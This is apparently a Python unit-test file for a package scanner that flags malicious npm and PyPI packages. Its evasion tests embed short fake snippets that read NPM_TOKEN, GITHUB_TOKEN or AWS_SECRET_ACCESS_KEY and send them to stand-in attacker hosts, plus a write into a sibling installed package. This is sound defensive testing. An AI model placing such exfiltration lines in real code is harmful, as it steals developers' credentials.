import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from pkgguard import scanner
from pkgguard.scanner import scan_directory

FIXTURES = Path(__file__).parent / "fixtures"


class TestBenignNpmPackage(unittest.TestCase):
    def test_no_findings(self):
        report = scan_directory(str(FIXTURES / "benign_npm_pkg"))
        self.assertEqual(report.verdict, "CLEAN")
        self.assertEqual(report.findings, [])


class TestMaliciousNpmPackage(unittest.TestCase):
    def setUp(self):
        self.report = scan_directory(str(FIXTURES / "malicious_npm_pkg"))

    def test_verdict_critical(self):
        self.assertEqual(self.report.verdict, "CRITICAL")

    def test_detects_remote_exec_lifecycle_script(self):
        ids = {f.rule_id for f in self.report.findings}
        self.assertIn("LIFECYCLE_REMOTE_EXEC", ids)

    def test_detects_secret_exfil_chain(self):
        ids = {f.rule_id for f in self.report.findings}
        self.assertIn("SECRET_EXFIL_CHAIN", ids)

    def test_detects_worm_sibling_write(self):
        ids = {f.rule_id for f in self.report.findings}
        self.assertIn("WORM_SIBLING_WRITE", ids)


class TestBenignPypiPackage(unittest.TestCase):
    def test_no_findings(self):
        report = scan_directory(str(FIXTURES / "benign_pypi_pkg"))
        self.assertEqual(report.verdict, "CLEAN")


class TestMaliciousPypiPackage(unittest.TestCase):
    def setUp(self):
        self.report = scan_directory(str(FIXTURES / "malicious_pypi_pkg"))

    def test_verdict_critical(self):
        self.assertEqual(self.report.verdict, "CRITICAL")

    def test_detects_shell_true(self):
        ids = {f.rule_id for f in self.report.findings}
        self.assertIn("SHELL_EXEC_SHELL_TRUE", ids)

    def test_detects_secret_exfil_chain(self):
        ids = {f.rule_id for f in self.report.findings}
        self.assertIn("SECRET_EXFIL_CHAIN", ids)


EXFIL_JS = (
    "const token = process.env.NPM_TOKEN;\n"
    "fetch('https://example-attacker.test/c', {method: 'POST', body: token});\n"
)


class TestEvasionResistance(unittest.TestCase):
    """Payload placement and syntax variations a real attacker would try."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.root = Path(self._tmp.name)

    def tearDown(self):
        self._tmp.cleanup()

    def write(self, rel: str, text: str) -> None:
        path = self.root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")

    def rule_ids(self):
        return {f.rule_id for f in scan_directory(str(self.root)).findings}

    def test_scans_dist_directory(self):
        # Most npm packages ship their runnable code in dist/.
        self.write("dist/index.js", EXFIL_JS)
        self.assertIn("SECRET_EXFIL_CHAIN", self.rule_ids())

    def test_scans_test_directories(self):
        # A lifecycle script can just as easily run tests/whatever.js.
        self.write("tests/setup.js", EXFIL_JS)
        self.write("test/setup.js", EXFIL_JS)
        report = scan_directory(str(self.root))
        files = {f.file.replace("\\", "/") for f in report.findings if f.rule_id == "SECRET_EXFIL_CHAIN"}
        self.assertEqual(files, {"tests/setup.js", "test/setup.js"})

    def test_scans_typescript_and_module_variants(self):
        for ext in ("mjs", "cjs", "mts", "cts", "jsx", "tsx"):
            self.write(f"src/payload.{ext}", EXFIL_JS)
        report = scan_directory(str(self.root))
        hits = [f for f in report.findings if f.rule_id == "SECRET_EXFIL_CHAIN"]
        self.assertEqual(len(hits), 6)

    def test_detects_node_prefixed_require(self):
        self.write(
            "index.js",
            "const https = require('node:https');\n"
            "https.request('https://x.test', {}).end(process.env.GITHUB_TOKEN);\n",
        )
        self.assertIn("SECRET_EXFIL_CHAIN", self.rule_ids())

    def test_detects_esm_import(self):
        self.write(
            "index.mjs",
            "import https from 'https';\n"
            "https.request('https://x.test', {}).end(process.env.NPM_TOKEN);\n",
        )
        self.assertIn("SECRET_EXFIL_CHAIN", self.rule_ids())

    def test_no_self_exemption_for_worm_rule(self):
        self.write(
            "index.js",
            "require('fs').writeFileSync('../node_modules/pkgguard/index.js', 'x');\n",
        )
        self.assertIn("WORM_SIBLING_WRITE", self.rule_ids())

    def test_python_urlopen_counts_as_network(self):
        self.write(
            "pkg/__init__.py",
            "import os\nfrom urllib.request import urlopen\n"
            "urlopen('https://x.test/?k=' + os.environ['AWS_SECRET_ACCESS_KEY'])\n",
        )
        self.assertIn("SECRET_EXFIL_CHAIN", self.rule_ids())

    def test_oversized_file_is_reported_not_silently_skipped(self):
        self.write("dist/bundle.js", EXFIL_JS + "// padding\n" * 50)
        with mock.patch.object(scanner, "MAX_FILE_BYTES", 64):
            report = scan_directory(str(self.root))
        ids = {f.rule_id for f in report.findings}
        self.assertIn("LARGE_FILE_NOT_SCANNED", ids)
        self.assertNotIn("SECRET_EXFIL_CHAIN", ids)

    def test_benign_regular_code_stays_clean(self):
        self.write("dist/index.js", "export function add(a, b) { return a + b; }\n")
        self.write("pkg/__init__.py", "def add(a, b):\n    return a + b\n")
        self.assertEqual(scan_directory(str(self.root)).verdict, "CLEAN")


if __name__ == "__main__":
    unittest.main()
